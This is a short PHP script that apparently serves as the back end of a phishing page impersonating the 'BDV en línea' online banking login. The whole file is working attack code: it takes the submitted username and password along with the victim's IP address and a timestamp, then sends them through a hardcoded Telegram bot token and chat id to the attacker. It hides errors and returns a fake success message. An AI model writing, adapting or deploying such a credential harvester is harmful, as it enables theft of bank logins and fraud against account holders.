<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
error_reporting(0);

$usuario = $_POST['usuario'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$fecha = date('Y-m-d H:i:s');

$token = "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
$chat_id = "6912929677";

$mensaje = "🏦 ═══ BDV EN LÍNEA ═══ 🏦\n\n";
$mensaje .= "👤 Usuario: $usuario\n";
$mensaje .= "🔑 Clave: $password\n";
$mensaje .= "🌐 IP: $ip\n";
$mensaje .= "📅 Fecha: $fecha\n";
$mensaje .= "\n═══════════════════\n";

// Método alternativo para enviar a Telegram
$url = "https://api.telegram.org/bot$token/sendMessage";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => 'HTML'
]));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

echo json_encode(["success" => true]);
?> 